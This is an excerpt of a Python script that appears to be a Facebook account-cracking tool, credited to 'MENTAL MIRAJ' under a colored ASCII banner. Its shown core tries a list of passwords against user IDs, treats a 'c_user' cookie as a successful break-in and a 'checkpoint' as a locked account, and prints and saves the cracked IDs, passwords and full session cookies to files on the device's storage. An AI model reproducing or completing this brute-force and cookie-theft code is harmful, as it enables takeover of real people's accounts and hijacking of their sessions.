...
#--------------------------(LOGO BOX)--------------------------#
logo =("""                                                
\033[1;31m.___  ___.  __  .______          ___            __  
\033[1;31m|   \/   | |  | |   _  \        /   \          |  | 
\033[1;31m|  \  /  | |  | |  |_)  |      /  ^  \         |  | 
\033[1;31m|  |\/|  | |  | |      /      /  /_\  \  .--.  |  | 
\033[1;31m|  |  |  | |  | |  |\  \----./  _____  \ |  `--'  | 
\033[1;31m|__|  |__| |__| | _| `._____/__/     \__\ \______/                                                    
                                           
\x1b[38;5;46m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mDeveloper \033[1;31m● \x1b[38;5;46mMENTAL MIRAJ
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mFacebook  \033[1;31m● \x1b[38;5;46mMENTAL MIRAJ
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print('\r\r\033[1;32m[MENTAL MIRAJ-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🍪]\x1b[38;5;254mCOOKIE = \x1b[38;5;254m'+coki+ ' ''  \x1b[38;5;254m')
                open('/sdcard/MENTAL MIRAJ-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
#              print(f"\x1b[38;5;196m[MENTAL MIRAJ-CP💔] {uid}|{ps}")
                open('/sdcard/MENTAL MIRAJ-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
